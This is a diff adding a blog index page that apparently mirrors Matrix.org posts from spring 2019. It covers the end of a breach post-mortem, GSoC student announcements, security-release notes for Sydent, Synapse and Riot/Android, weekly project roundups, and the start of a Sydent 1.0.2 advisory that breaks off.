+<li>The build environment installation is scripted and installs on a fresh OS image (letting us easily build new release terminals as needed)</li>
+<li>The signing keys (hardware or software) are kept exclusively on this device.</li>
+<li>The publishing SSH keys (hardware or software) used to push to the packaging servers are kept exclusively on this device.</li>
+<li>We physically store the device securely.</li>
+<li>We ensure someone on the team always has physical access to it in order to do emergency builds.</li>
+</ul>
+</li>
+<li>Meanwhile, releases are distributed using dedicated infrastructure, entirely isolated from the rest of production.
+<ul>
+<li>These live at <a href="https://packages.matrix.org">https://packages.matrix.org</a> and <a href="https://packages.riot.im">https://packages.riot.im</a></li>
+<li>These are minimal machines with nothing but a static web-server.</li>
+<li>They are accessed only via the dedicated SSH keys stored on the release terminal.</li>
+<li>These in turn can be mirrored in future to avoid a SPOF (or we could cheat and use Cloudflare’s <a href="https://www.cloudflare.com/always-online/">always online</a> feature, for better or worse).</li>
+</ul>
+</li>
+</ul>
+<p>Alternatives here included:</p>
+<ul>
+<li>In an ideal world we’d do reproducible builds instead, and sign the build’s hash with a hardware key, but given we don’t have reproducible builds yet this will have to suffice for now.</li>
+<li>We could delegate building and distribution entirely to a 3rd party setup such as OBS (as per <a href="https://github.com/matrix-org/matrix.org/issues/370">https://github.com/matrix-org/matrix.org/issues/370</a>).  However, we have a very wide range of artefacts to build across many different platforms and OSes, so would rather build ourselves if we can.</li>
+</ul>
+<h4 id="dev-and-ci-infrastructure">Dev and CI infrastructure</h4>
+<p>The main change in our dev and CI infrastructure is to move from Jenkins to <a href="https://buildkite.com/matrix-dot-org">Buildkite</a>.  The latter has been serving us well for Synapse builds over the last few months, and has now been extended to serve all the main CI pipelines that Jenkins was providing.  Buildkite works by orchestrating jobs on a elastic pool of CI workers we host in our own AWS, and so far has done so quite painlessly.</p>
+<p>The new pipelines have been set up so that where CI needs to push artefacts to production for continuous deployment (e.g. <a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/riot.im/develop">riot.im/develop</a>), it does so by poking production via HTTPS to trigger production to pull the artefact from CI, rather than pushing the artefact via SSH to production.</p>
+<p>Other than CI, our strategy is:</p>
+<ul>
+<li>Continue using Github for public repositories</li>
+<li>Use gitlab.matrix.org for private repositories (and stuff which we don’t want to re-export via the US, like <a href="https://gitlab.matrix.org/matrix-org/olm">Olm</a>)</li>
+<li>Continue to host docker images on Docker Hub (despite their recent <a href="https://success.docker.com/article/docker-hub-user-notification">security dramas</a>).</li>
+</ul>
+<h4 id="log-minimisation-and-handling-personally-identifying-information-pii">Log minimisation and handling Personally Identifying Information (PII)</h4>
+<p>Another thing that the breach made painfully clear is that we log too much.  While there’s not much evidence of the attacker going spelunking through any Matrix service log files, the fact is that whilst developing Matrix we’ve kept logging on matrix.org relatively verbose to help with debugging.  There’s nothing more frustrating than trying to trace through the traffic for a bug only to discover that logging didn’t pick it up.</p>
+<p>However, we can still improve our logging and PII-handling substantially:</p>
+<ul>
+<li>Ensuring that wherever possible, we hash or at least truncate any PII before logging it (access tokens, matrix IDs, 3rd party IDs etc).</li>
+<li>Minimising log retention to the bare minimum we need to investigate recent issues and abuse</li>
+<li>Ensuring that PII is stored hashed wherever possible.</li>
+</ul>
+<p>Meanwhile, in Matrix itself we already are very mindful of handling PII (c.f. our <a href="https://github.com/vector-im/policies/tree/master/docs/matrix-org">privacy policies</a> and <a href="https://matrix.org/blog/2018/05/08/gdpr-compliance-in-matrix/">GDPR work</a>), but there is also more we can do, particularly:</p>
+<ul>
+<li>Turning on end-to-end encryption by default, so that even if a server is compromised, the attacker cannot get at private message history.  Everyone who uses E2EE in Matrix should have felt some relief that even though the server was compromised, their message history was safe: we need to provide that to everyone.  This is <a href="https://github.com/vector-im/riot-web/issues/6779">https://github.com/vector-im/riot-web/issues/6779</a>.</li>
+<li>We need device audit trails in Matrix, so that even if a compromised server (or malicious server admin) temporarily adds devices to your account, you can see what’s going on.  This is <a href="https://github.com/matrix-org/synapse/issues/5145">https://github.com/matrix-org/synapse/issues/5145</a></li>
+<li>We need to empower users to configure history retention in their rooms, so they can limit the amount of history exposed to an attacker. This is <a href="https://github.com/matrix-org/matrix-doc/pull/1763">https://github.com/matrix-org/matrix-doc/pull/1763</a></li>
+<li>We need to provide account portability (aka decentralised accounts) so that even if a server is compromised, the users can seamlessly migrate elsewhere. The first step of this is <a href="https://github.com/matrix-org/matrix-doc/pull/1228">https://github.com/matrix-org/matrix-doc/pull/1228</a>.</li>
+</ul>
+<h3 id="conclusion">Conclusion</h3>
+<p>Hopefully this gives a comprehensive overview of what happened in the breach, how we handled it, and what we are doing to protect against this happening in future.</p>
+<p>Again, we’d like to apologise for the massive inconvenience this caused to everyone caught in the crossfire. Thank you for your patience and for sticking with the project whilst we restored systems. And while it is very unfortunate that we ended up in this situation, at least we should be coming out of it much stronger, at least in terms of infrastructure security.  We’d also like to particularly thank <a href="https://www.linkedin.com/in/kade-morton-34179283/">Kade Morton</a> for providing independent review of this post and our remediations, and everyone who reached out with #hugops during the incident (it was literally the only positive thing we had on our radar), and finally thanks to the those of the Matrix team who hauled ass to rebuild the infrastructure, and also those who doubled down meanwhile to keep the rest of the project on track.</p>
+<p>On which note, we’re going to go back to building decentralised communication protocols and reference implementations for a bit...  Emoji reactions are on the horizon (at last!), as is Message Editing, RiotX/Android and a host of other long-awaited features - not to mention finally releasing Synapse 1.0.  So: thanks again for flying Matrix, even during this period of extreme turbulence and, uh, hijack.  Things should mainly be back to normal now and for the foreseeable.</p>
+<p><i>Given the new blog doesn't have comments yet, feel free to discuss the post over at <a href="https://news.ycombinator.com/item?id=19857744">HN</a>.</i></p>
+
+        </div>
+    </article>
+    
+    <article class="post">
+        <header>
+            <h1><a href="https:&#x2F;&#x2F;tune-your-chat.github.io&#x2F;blog&#x2F;2019&#x2F;05&#x2F;07&#x2F;welcome-to-the-2019-g-so-c-participants&#x2F;" title="Welcome to the 2019 GSoC Participants!">Welcome to the 2019 GSoC Participants!</a></h1>
+            <span>
+                07.05.2019 00:00
+                —
+                <a href="/category/gsoc">
+                    GSOC
+                </a>
+                —
+                
+                <a href="/author/andrew-morgan">
+                    Andrew Morgan
+                </a>
+                
+            </span>
+            
+        </header>
+        <div>
+            <p>It’s that time of year again! Matrix.org is once again participating in the <a href="https://summerofcode.withgoogle.com/">Google Summer of Code</a> program. We have been allocated four student slots by Google this year, and narrowing the 18 proposals we received down to just four was a very difficult task.</p>
+<p>In the end, we have decided on the following four students and their proposed projects:</p>
+<p>Alexey Andreyev’s proposal involves adding end-to-end encryption to <a href="https://github.com/QMatrixClient/libqmatrixclient">libQMatrixClient</a> for future support in Qt/libQMatrixClient-based clients such as <a href="https://github.com/QMatrixClient/Quaternion">Quaternion</a> and <a href="https://gitlab.com/spectral-im/spectral/">Spectral</a>. They will be mentored by <a href="https://matrix.to/#/@kitsune:matrix.org">kitsune</a>, lead developer of libQMatrixClient, and our own end-to-end encryption expert, <a href="https://matrix.to/#/@uhoreg:matrix.org">uhoreg</a>.</p>
+<p>Kai Hiller’s proposal for more reliable third-party protocol <a href="https://matrix.org/docs/projects/bridges">bridges</a> includes adding the ability to notify the user when a message fails to reach its final destination despite being accepted by the bridge. <a href="https://matrix.to/#/@half-shot:half-shot.uk">Half-Shot</a>.</p>
+<p>Eisha Chen-yen-su’s proposal for Matrix Visualisations aims to “develop a tool which will visualise the event Directed Acyclic Graph data structure which describes the conversation history in a room. It will be a real-time visualisation of the DAG of a given Matrix room, as seen from the perspective of one or more HomeServers (HSes).” They state that “this tool will be useful for debugging or administration of Matrix HSes by making people able to easily see how the federation process works”. They have already posted prototypes of their tool in <a href="https://matrix.to/#/#gsoc:matrix.org">#gsoc:matrix.org</a>, and it’s all written in Rust! Which makes their mentor, <a href="https://matrix.to/#/@erikj:jki.re">erikj</a>, very happy.</p>
+<p>And finally, Cnly’s proposal for working towards completion of <a href="https://github.com/matrix-org/dendrite">Dendrite</a>’s Client-Server API. The proposal also touches on general improvements to the codebase and increasing test coverage. Cnly will be mentored by <a href="https://matrix.to/#/@brendan:abolivier.bzh">babolivier</a> and <a href="https://matrix.to/#/@andrewm:amorgan.xyz">anoa</a>.</p>
+<p>Congratulations to the selected students. We look forward to participating with you on completing your project over the course of the summer holidays.</p>
+<p>If your proposal was not selected, do not give up hope! Being an active member of the Matrix community and having a deep understanding of the ecosystem and its projects is a big part of what we look for when choosing candidates. If you stick around, you have a strong chance of being chosen in a subsequent year.</p>
+<p>We will not be sharing individual’s proposal documents, but students are free to share them as they please.</p>
+
+        </div>
+    </article>
+    
+    <article class="post">
+        <header>
+            <h1><a href="https:&#x2F;&#x2F;tune-your-chat.github.io&#x2F;blog&#x2F;2019&#x2F;05&#x2F;03&#x2F;security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28a&#x2F;" title="Security updates: Sydent 1.0.3, Synapse 0.99.3.1 and Riot&#x2F;Android 0.9.0 &#x2F; 0.8.99 &#x2F; 0.8.28a">Security updates: Sydent 1.0.3, Synapse 0.99.3.1 and Riot&#x2F;Android 0.9.0 &#x2F; 0.8.99 &#x2F; 0.8.28a</a></h1>
+            <span>
+                03.05.2019 00:00
+                —
+                <a href="/category/general">
+                    General
+                </a>
+                —
+                
+                <a href="/author/matthew-hodgson">
+                    Matthew Hodgson
+                </a>
+                
+            </span>
+            
+        </header>
+        <div>
+            <p>Hi all,</p>
+<p>Over the last few weeks we’ve ended up getting a lot of attention from the security research community, which has been incredibly useful and massively appreciated in terms of contributions to improve the security of the reference Matrix implementations.</p>
+<p>We’ve also set up an official <a href="https://matrix.org/security-disclosure-policy/">Security Disclosure Policy</a> to explain the process of reporting security issues to us safely via responsible disclosure - including a Hall of Fame to credit those who have done so.  (Please mail <a href="mailto:security@matrix.org">security@matrix.org</a> to remind us if we’ve forgotten you!).</p>
+<p>Since we published the Hall of Fame yesterday, we’ve already been getting new entries and so we’re doing a set of security releases today to ensure they are mitigated asap.  Unfortunately the work around this means that we’re running late in publishing the post mortem of the <a href="https://matrix.org/blog/2019/04/11/security-incident">Apr 11 security incident</a> - we are trying to get that out as soon as we can.</p>
+<h2 id="sydent-1-0-3">Sydent 1.0.3</h2>
+<p>Sydent 1.0.3 has three security fixes:</p>
+<ul>
+<li>Ensure that authentication tokens are generated using a secure random number generator, ensuring they cannot be predicted by an attacker.  This is an important fix - please update.  Thanks to Enguerran Gillier (<a href="https://twitter.com/@opnsec">@opnsec</a>) for identifying and responsibly disclosing the issue!</li>
+<li>Mitigate an HTML injection bug where an invalid room_id could result in malicious HTML being injected into validation emails.  <strong>The fix for this is in the email template itself; you will need to update any customised email templates to be protected.</strong>  Thanks to Enguerran Gillier (<a href="https://twitter.com/@opnsec">@opnsec</a>) for identifying and responsibly disclosing this issue too!</li>
+<li>Randomise session_ids to avoid leaking info about the total number of identity validations, and whether a given ID has been validated.  Thanks to <a href="https://fs0c131y.com">@fs0c131y</a> for identifying and responsibly disclosing this one.</li>
+</ul>
+<p>If you are running Sydent as an identity server, you should update as soon as possible from <a href="https://github.com/matrix-org/sydent/releases/v1.0.3">https://github.com/matrix-org/sydent/releases/v1.0.3</a>.  We are not aware of any of these issues having been exploited maliciously in the wild.</p>
+<h2 id="synapse-0-99-3-1">Synapse 0.99.3.1</h2>
+<p>Synapse 0.99.3.1 is a security update for two fixes:</p>
+<ul>
+<li>Ensure that random IDs in Synapse are generated using a secure random number generator, ensuring they cannot be predicted by an attacker. Thanks to Enguerran Gillier (<a href="https://twitter.com/@opnsec">@opnsec</a>) for identifying and responsibly disclosing this issue!</li>
+<li>Add 0.0.0.0/32 and ::/128 to the URL preview blacklist configuration, ensuring that an attacker cannot make connections to localhost. Thanks to Enguerran Gillier (<a href="https://twitter.com/@opnsec">@opnsec</a>) for identifying and responsibly disclosing this issue too!</li>
+</ul>
+<p>You can update from <a href="https://github.com/matrix-org/synapse/releases">https://github.com/matrix-org/synapse/releases</a> or similar as normal. We are not aware of any of these issues having been exploited maliciously in the wild.</p>
+<p>(Synapse 0.99.3.2 was released shortly afterwards to fix a non-security issue with the Debian packaging)</p>
+<h2 id="riot-android-0-9-x-0-8-99-google-play-and-0-8-28a-f-droid">Riot/Android 0.9.x/0.8.99 (Google Play) and 0.8.28a (F-Droid)</h2>
+<p>Riot/Android has an important security fix which shipped over the course of the last week in various versions of the app:</p>
+<ul>
+<li>Remove obsolete and buggy ContentProvider which could allow a malicious local app to compromise account data. Many thanks to Julien Thomas (<a href="https://twitter.com/@julien_thomas">@julien_thomas</a>) from <a href="https://protektoid.com">Protektoid Project</a> for identifying this and responsibly disclosing it!</li>
+</ul>
+<p>The fix for this shipped on F-Droid since 0.8.28a, and on the Play Store, the fix is present in both v0.9.0 (the first version of the re-published Riot app) and v0.8.99 (the last version of the old Riot app, which told everyone to reinstall).  Other forks of Riot which we’re aware of have also been informed and should be updated.</p>
+<p>If you haven’t already updated, please do so now.</p>
+
+        </div>
+    </article>
+    
+    <article class="post">
+        <header>
+            <h1><a href="https:&#x2F;&#x2F;tune-your-chat.github.io&#x2F;blog&#x2F;2019&#x2F;05&#x2F;03&#x2F;this-week-in-matrix-2019-05-03&#x2F;" title="This Week in Matrix 2019-05-03">This Week in Matrix 2019-05-03</a></h1>
+            <span>
+                03.05.2019 00:00
+                —
+                <a href="/category/this-week-in-matrix">
+                    This Week in Matrix
+                </a>
+                —
+                
+                <a href="/author/ben-parsons">
+                    Ben Parsons
+                </a>
+                
+            </span>
+            
+        </header>
+        <div>
+            <h2 id="new-matrix-org-security-disclosure-policy-and-moderation-pages">New matrix.org Security Disclosure Policy and moderation pages</h2>
+<p>Check out the Matrix Official Security Disclosure Policy, which also features a "Hall of Fame": https://matrix.org/security-disclosure-policy/</p>
+<p>We also have an official moderation guide now at https://matrix.org/docs/guides/moderation</p>
+<h2 id="servers">Servers</h2>
+<h3 id="synapse">Synapse</h3>
+<h4 id="last-week">Last week</h4>
+<p>Work progresses on reactions support, expect a more formal MSC rsn, but for check out https://github.com/matrix-org/matrix-doc/blob/matthew/msc1849/proposals/1849-aggregations.md for more details. Aside from that we now have an API to send server notices, support is coming for blacklisting IP ranges for federation traffic and finally we published a security disclosure policy and hall of fame https://matrix.org/security-disclosure-policy/. We’ve also been tracking down some device management bugs that prevent e2e message decryption as well as fixing some security bugs.</p>
+<h4 id="next-week">Next week</h4>
+<p>More reactions work, device management bug hunting and server key validity support.</p>
+<h3 id="crypto">Crypto</h3>
+<ul>
+<li>Olm 3.1.2 bugfix release.</li>
+<li><a href="https://github.com/matrix-org/pantalaimon">Pantalaimon</a>: Initial SAS support through panctl http://webmshare.com/play/QeBY1</li>
+<li>Pantalaimon: Support for sending out key requests.</li>
+</ul>
+<h2 id="clients">Clients</h2>
+<p>There are some <strong>BIG</strong> (capital and bold!) client releases this week, let's take a look</p>
+<h3 id="quaternion-0-0-9-4">Quaternion 0.0.9.4</h3>
+<p>Big release for Quaternion this week, following lots of work on <a href="https://github.com/QMatrixClient/libqmatrixclient">libQMatrixClient</a>. <a href="https://matrix.to/#/@kitsune:matrix.org">kitsune</a> reports that:</p>
+<p>Quaternion is now officially at version 0.0.9.4! Optional native scrollbar for the timeline, files uploading, initial support of matrix.to links (the foundation for future Matrix URIs), first complete translations, and much much more - the long list is here: https://github.com/QMatrixClient/Quaternion/releases/tag/0.0.9.4. Packagers are advised to take a look at the building and packaging section of the release notes: there are a few updates for you there.</p>
+<h2 id="spectral">Spectral</h2>
+<p>Continuing the QT-client theme, <a href="https://matrix.to/#/@bhat:encom.eu.org">Black Hat</a> has released a new version of <a href="https://gitlab.com/spectral-im/spectral">Spectral</a> to FlatHub, join <a href="https://matrix.to/#/#spectral:matrix.org">#spectral:matrix.org</a> for more:</p>
+<blockquote>
+<p>A new version of Spectral is released on Flathub this week! The last release is half a year ago, and there are a lot of changes since then, including a better UI, bug fixes and performance improvements.</p>
+</blockquote>
+<p>Changelog:</p>
+<pre style="background-color:#1e1e1e;color:#dcdcdc;"><code><span>Increase minimum Qt version to 5.12.
+</span><span>Redesigned UI.
+</span><span>Emoji and username auto completion in text input.
+</span><span>Respect server-side notification settings.
+</span><span>Emoji picker.
+</span><span>Fix font size in HiDPI.
+</span><span>Improved reply UI/UX and rich reply UI.
+</span><span>Sending/receiving typing notifications.
+</span><span>Switch to hoedown for parsing markdown.
+</span><span>Display notification count.
+</span><span>Responsive UI.
+</span><span>Fix #2(Room/People separator issue).
+</span><span>Infer device name from system information.
+</span><span>Image caching.
+</span></code></pre>
+<blockquote>
+<p>And of course various performance improvements. For my account Spectral takes ~35MB RAM initially, compared to 45~50MB before.</p>
+</blockquote>
+<h2 id="pattle-new-release">Pattle new release</h2>
+<p><img src="/blog/pattle2019-05-03.png" alt="pattle screenshots" /></p>
+<p><a href="https://matrix.to/#/@wilko:matrix.org">Wilko</a> came to announce a new Pattle release, that's the Flutter client:</p>
+<blockquote>
+<p>A new release of Pattle has been pushed to F-droid! Lots of different changes this release, including:</p>
+<ul>
+<li>Viewing images!</li>
+<li>Actual local echo (message is immediately placed in the timeline)</li>
+<li>Sent state indicators are now shown next to the message time (clock for still being sent and a checkmark for sent)</li>
+<li>Show member change events! (x has joined, left, invited, etc)</li>
+<li>Thumbnails are now used for chat avatars, which should improve performance a bit</li>
+<li>Other small fixes :)</li>
+</ul>
+</blockquote>
+<p>Check out a <a href="https://matrix.org/_matrix/media/v1/download/matrix.org/BVlZqkwaLUuvigMcDfiddsqQ">video demo at here</a>.</p>
+<h3 id="continuum">continuum</h3>
+<p><a href="https://matrix.to/#/@uforia:matrix.org">yuforia</a> reports that:</p>
+<blockquote>
+<p>This week in <a href="https://github.com/koma-im/continuum-desktop">continuum</a>:</p>
+<ul>
+<li>Remove support for embedded webview and open external browsers when necessary instead.  Many users actually prefer it this way. And dependency on a fairly large native module is gone.</li>
+<li>Improvements on the emoji input. Removed some style classes and tweaked some sizes to make the appearance more compact and flat.  https://matrix.org/_matrix/media/v1/download/matrix.org/PvFFPAvoDhiHghsyeJnWVyAK</li>
+</ul>
+</blockquote>
+<h3 id="riot-web">Riot Web</h3>
+<p>Initial UI work on reactions and editing, nothing useable yet though.</p>
+<h3 id="riot-ios">Riot iOS</h3>
+<ul>
+<li>Release of 0.8.5 :
+<ul>
+<li>Grouped notifications</li>
+<li>Interactive device verification (by emoji)</li>
+<li>WebRTC and Jitsi libs updates</li>
+<li>min iOS version is now 10 (Jitsi constraints)</li>
+</ul>
+</li>
+<li>Initial UI work on reactions, nothing useable yet though.</li>
+</ul>
+<h3 id="riot-android">Riot Android</h3>
+<p>Benoit from the Riot team:</p>
+<blockquote>
+<ul>
+<li>CI has been configured on Buildkite for the Android matrix sdk, riot and riotx.</li>
+<li>The Android sdk can now be integrate as a grate dependency via Jitpack.</li>
+<li>Riot 0.9.1 has been released with sas feature included! Device verification is easier with riot web and riot Android users, soon with riot ios users. Will be on production channel on Monday.</li>
+<li>We have finally pushed the security fix on GH.</li>
+<li>Also working on the crypto modularization to integrate it on RiotX.</li>
+<li>We will concentrate our effort on RiotX now</li>
+</ul>
+</blockquote>
+<h3 id="riotx-android">RiotX (Android)</h3>
+<blockquote>
+<ul>
+<li>Working on reactions</li>
+</ul>
+</blockquote>
+<h2 id="bridges">Bridges</h2>
+<h3 id="matrix-appservice-discord-searching-for-a-new-maintainer">matrix-appservice-discord searching for a new maintainer</h3>
+<p><a href="https://matrix.to/#/@sorunome:sorunome.de">Sorunome</a> reports that:</p>
+<blockquote>
+<p>We (<a href="https://github.com/Half-Shot/matrix-appservice-discord">matrix-appservice-discord</a>) are looking for a new maintainer!</p>
+<p>What are we looking for in a maintainer?<br />
+You wouldn't have to be super active, however a few minutes per day would be greatly appreciated. You'd be responsible of reviewing PRs! Because of this not being afraid of Typescript and not being afraid of Discord is required - no need to be at pro-level!</p>
+<p>So we are basically looking for someone who can help us look over PRs and maybe do some themself. If you think you are interested, please message us in <a href="https://matrix.to/#/#discord:half-shot.uk">our matrix room</a>!</p>
+</blockquote>
+<h3 id="bridging-facebook-messenger">Bridging Facebook Messenger</h3>
+<p><a href="https://matrix.to/#/@tulir:maunium.net">tulir</a>:</p>
+<blockquote>
+<p>I made a new Facebook Messenger bridge: https://github.com/tulir/mautrix-facebook / <a href="https://matrix.to/#/#facebook:maunium.net">#facebook:maunium.net</a>. Currently the main difference to <a href="https://github.com/matrix-hacks/matrix-puppet-facebook">matrix-puppet-facebook</a> is multi-user support like my WhatsApp and Telegram bridges. The bridge is Python and the code structure is similar to <a href="https://github.com/tulir/mautrix-telegram">mautrix-telegram</a>, so I'll probably eventually create a generic bridge library out of the common parts.</p>
+</blockquote>
+<h2 id="sdks-and-frameworks">SDKs and Frameworks</h2>
+<h3 id="ruby-sdk">Ruby SDK</h3>
+<p><a href="https://github.com/ananace/">Ananace</a> reports that:</p>
+<blockquote>
+<p>Working on the <a href="https://github.com/ananace/ruby-matrix-sdk">Ruby SDK</a> again, planning to try and get it to the point where I feel comfortable calling it a provisionary 1.0 release. I want to propose additions to various software using it after all, and that tends to look better if it's 1.0 - or close. 😃</p>
+</blockquote>
+<h2 id="that-s-all-i-know">That's all I know</h2>
+<p>That's all for this week folks, come chat in <a href="https://matrix.to/#/#twim:matrix.org">#twim:matrix.org</a> for more, or to share what you've been working on.</p>
+<p>PS <a href="https://github.com/bahlox/tangent">this interesting-looking project</a> is not ready for public eyes on it yet, so please refrain from checking out the code and discussing with the author in <a href="https://matrix.to/#/#tangent:matrix.org">#tangent:matrix.org</a></p>
+
+        </div>
+    </article>
+    
+    <article class="post">
+        <header>
+            <h1><a href="https:&#x2F;&#x2F;tune-your-chat.github.io&#x2F;blog&#x2F;2019&#x2F;04&#x2F;26&#x2F;this-week-in-matrix-2019-04-26&#x2F;" title="This Week in Matrix 2019-04-26">This Week in Matrix 2019-04-26</a></h1>
+            <span>
+                26.04.2019 00:00
+                —
+                <a href="/category/this-week-in-matrix">
+                    This Week in Matrix
+                </a>
+                —
+                
+                <a href="/author/neil-johnson">
+                    Neil Johnson
+                </a>
+                
+            </span>
+            
+        </header>
+        <div>
+            <h2 id="hello-and-welcome">Hello and welcome</h2>
+<p>No Ben this week. I'm afraid this means no matrix live, but fear not your Ben orientated programming will resume next week.</p>
+<h2 id="things-that-have-happened">Things that have happened</h2>
+<h2 id="riot-android">Riot Android</h2>
+<ul>
+<li>New Riot.im application has been delivered to the PlayStore:  https://play.google.com/store/apps/details?id=im.vector.app. It replaces the previous app. More details here: https://medium.com/@RiotChat/riot-im-android-security-update-2b3f655ad739</li>
+<li>François and Benoit were at AndroidMakers Paris on Tuesday and Wednesday. We’ve seen plenty of interesting conferences and come back with many ideas to improve Riot UX/UI/Implementation/testing/etc.</li>
+<li>SAS device verification review is over, will be merged once we have the tagged OLM library.</li>
+</ul>
+<h2 id="riotx-android">RiotX (Android)</h2>
+<ul>
+<li>Valere has started working on reactions (which will be implemented only on RiotX for Android).</li>
+<li>François has worked on merging membership Events in the timeline</li>
+</ul>
+<h2 id="riot-ios">Riot iOS</h2>
+<ul>
+<li>Interactive device verification has been merged</li>
+<li>Jitsi and WebRTC updates have been merged</li>
+<li>Fix bugs in order to prepare a release</li>
+</ul>
+<h2 id="crypto">Crypto</h2>
+<p><a href="https://matrix.to/#/@uhoreg:matrix.org">uhoreg</a> reports that:</p>
+<blockquote>
+<p>olm 3.1.0 has been released. This release adds new functions to help with SAS-based key verification (a.k.a. emoji-based verification) and with cross-signing. The Python bindings are also now available on pypi, so you can install it using "pip install python-olm", though you need the olm library and development files installed first.</p>
+</blockquote>
+<p>Also</p>
+<ul>
+<li>Python-olm available on pypi.</li>
+<li>Initial SAS verification support for nio.</li>
+</ul>
+<h2 id="spectral">Spectral</h2>
+<p><a href="https://matrix.to/#/@bhat:encom.eu.org">Black Hat</a> reports that:</p>
+<p>Spectral's redesign continues, featuring a beautiful responsive UI(not kirigami yet, sorry) and more functionalities. Legacy UIs such as the room detail panel are changed to fit into redesigned UI better. Basic room upgrade support is added, allowing you to switch between the old room and the new room. Room settings and user detail dialogs are added. You can also ignore users in the user detail dialog.</p>
+<p><img src="/blog/spectral.2019-04-26.1.png" alt="" />
+<img src="/blog/spectral.2019-04-26.2.png" alt="" /></p>
+<h2 id="matrix-nsfw">matrix-nsfw</h2>
+<p>A <a href="https://matrix.to/#/@bhat:encom.eu.org">Black Hat</a> double header this week:</p>
+<blockquote>
+<p>matrix-nsfw has been ported from Golang to Rust. The backend machine learning framework is also switched to Tensorflow, giving a major performance boost. For anyone that doesn't know what matrix-nsfw is, it is a bot-like utility that detects NSFW images in a room. The new repo is at https://gitlab.com/b0/matrix-nsfw-rust</p>
+</blockquote>
+<h2 id="neo">Neo</h2>
+<p>Sometimes a picture tells a thousands rainbow coloured words. Thanks <a href="https://matrix.to/#/@f0x:lain.haus">Foks</a></p>
+<p><img src="/blog/neo.2019-04-26.png" alt="" /></p>
+<h2 id="ruma">Ruma</h2>
+<p><a href="https://matrix.to/#/@jimmycuadra:matrix.org">Jimmy</a> reports that:</p>
+<blockquote>
+<p>All of Ruma's libraries (but not yet the homeserver itself) are now targeting stable Rust!</p>
+</blockquote>
+<h2 id="continiuum">Continiuum</h2>
+<p><a href="https://matrix.to/#/@uforia:matrix.org">yuforia</a> reports that:</p>
+<blockquote>
+<ul>
+<li>If a room member is not visible on screen, updating their name doesn't require switching to the main UI thread</li>
+</ul>
+</blockquote>
+<ul>
+<li>Apply formatting when viewing the json source of an event</li>
+<li>Reuse GUI components to improve performance, update content of views instead of creating new ones</li>
+<li>Use a hash set to avoid going through the list of room members in some cases * Move more of local storage into the database: names and avatars of users and rooms, room membership, recently used accounts, etc.</li>
+<li>Placeholder avatars are made with GUI components and instead of generated bitmap images</li>
+<li>Switch to gradle multi-project build to modularize</li>
+</ul>
+<blockquote>
+<p>After switching from plaintext files to an embedded database, some components are still in the process of being rewritten, coming next week: load messages from server on demand when scrolling, if they are not yet stored in database; add support for invitations;</p>
+</blockquote>
+<h2 id="matrix-appservice-discord">matrix-appservice-discord</h2>
+<p><a href="https://matrix.to/#/@sorunome:sorunome.de">Sorunome</a> reports that:</p>
+<blockquote>
+<p>matrix-appservice-discord work has finally resumed! The PRs for both migrating the room and user store to SQL have been merged, and many awesome new things should follow up soon!</p>
+</blockquote>
+<h2 id="synapse">Synapse</h2>
+<p>The reactions and edits API is taking shape, we’re making progress on our small homeserver setup, and we’re hunting a new set of device key management bugs that came to light in the absence of matrix.org.</p>
+<p>We’ve been a bit disrupted these past few weeks, but work towards Synapse 1.0 continues and we’ll soon be ready to offer a release candidate.</p>
+<h2 id="minivector">miniVector</h2>
+<p><a href="https://matrix.to/#/@wtp2018:matrix.org">Curious Cat</a> reports that:</p>
+<blockquote>
+<p>miniVector 0.8.29 is available on Goldy and Froid (and are unaffected by the Riot/Android <a href="https://medium.com/@RiotChat/riot-im-android-security-update-2b3f655ad739">re-release drama</a>).</p>
+</blockquote>
+<h2 id="the-incident">The 'Incident'</h2>
+<p>We know you'll have a bunch of questions, we'll be publishing a full post-mortem next week. Thanks for bearing with us.</p>
+<h2 id="the-end">The End</h2>
+<p>See you next week, it will be Bentastic I can assure you. Be sure to stop by <a href="https://matrix.to/#/#TWIM:matrix.org">#twim:matrix.org</a> with your updates!</p>
+
+        </div>
+    </article>
+    
+    <article class="post">
+        <header>
+            <h1><a href="https:&#x2F;&#x2F;tune-your-chat.github.io&#x2F;blog&#x2F;2019&#x2F;04&#x2F;18&#x2F;security-update-sydent-1-0-2&#x2F;" title="Security Update: Sydent 1.0.2">Security Update: Sydent 1.0.2</a></h1>
+            <span>
+                18.04.2019 00:00
+                —
+                <a href="/category/general">
+                    General
+                </a>
+                —
+                
+                <a href="/author/matrix-org-team">
+                    Matrix.org Team
+                </a>
+                
+            </span>
+            
+        </header>
+        <div>
+            <h2 id="overview">Overview</h2>
+<p>We became aware today of a flaw in <a href="https://github.com/matrix-org/sydent">sydent</a>’s validation of email addresses which can lead to a failure to correctly limit registration to a given email domain.  <strong>This only affects people who run their own sydent, and are relying on allowed_local_3pid in their synapse config.</strong> We’d like to thank <a href="https://twitter.com/fs0c131y">@fs0c131y</a> for bringing it to our attention on <a href="https://twitter.com/fs0c131y/status/1118791420624687104">Twitter</a> this morning.  We are not aware of this being exploited in the wild other than the initial report.</p>
+<p><strong>If you are running your own sydent, and limiting signup for your server using the <code>allowed_local_3pids</code> configuration option, then you need to upgrade your sydent immediately to Sydent 1.0.2.</strong></p>
+<p>Meanwhile, if you have been relying on the <code>allowed_local_3pids</code> configuration option to restrict access to your homeserver, you may wish to check your homeserver’s user_threepids table for malformed email addresses and your sydent’s database as follows:</p>
+<pre style="background-color:#1e1e1e;color:#dcdcdc;"><code><span>$ sqlite3 sydent.db 
+</span><span>sqlite&gt; select count(*) from global_threepid_associations where address like &#39;%@%@%&#39;;
+</span><span>0
+</span><span>
+</span><span>$ psql matrix
+</span><span>matrix=&gt; select count(*) from user_threepids where address like &#39;%@%@%&#39;;
+</span><span> count 
+</span><span>-------
+</span><span>     0
+</span></code></pre>
+<p>If the queries return more than 0 results, please let us know at <a href="mailto:security@matrix.org">security@matrix.org</a> - otherwise you are fine.</p>
+<h2 id="details">Details</h2>
+<p>A flaw existed in sydent whereby it was possible to bypass the requirement specified in synapse’s <code>allowed_local_3pids</code> option, which restricts that users may only register with an email address matching a specific format.</p>
+<p>This relied on two things:</p>
+<ol>
